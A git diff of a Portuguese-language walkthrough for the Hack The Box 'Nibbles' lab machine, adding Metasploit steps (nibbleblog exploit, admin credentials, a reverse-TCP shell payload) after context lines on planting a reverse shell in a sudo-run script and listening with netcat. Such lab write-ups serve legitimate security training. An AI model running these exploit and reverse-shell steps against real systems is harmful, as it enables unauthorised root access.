@@ -82,3 +82,19 @@ shell reverso no final do arquivo .sh para que possamos ter acesso como root
 > sudo /home/nibbler/personal/sutff/monitor.sh
 7. lembre-se de ficar escutando utilizar o netcat na porta determinada do script
 > nc -lvnp <port>
+
+## Nibbles - Alternate User Method - Metasploit
+1. É possível utilizar o metasploit nesse modo tbm, primeiro acione o console.
+> msfconsole
+2. Pesquise o exploit
+> search exploit nibbleblog
+3. utilize o primeiro exploit e set o IP do host no rhosts e no lhost adicione o ip do seu vpn
+> use 0
+> set rhosts <ip alvo>
+> set lhost <ip vpn>
+4. Precisamos setar o username e a senha, além da uri do alvo
+> set username admin
+> set password nibbles
+> set targetuir nibbleblog
+5. Também precisamos informar um shell reverso que queremos carregar
+> set payload generic/shell_reverse_tcp
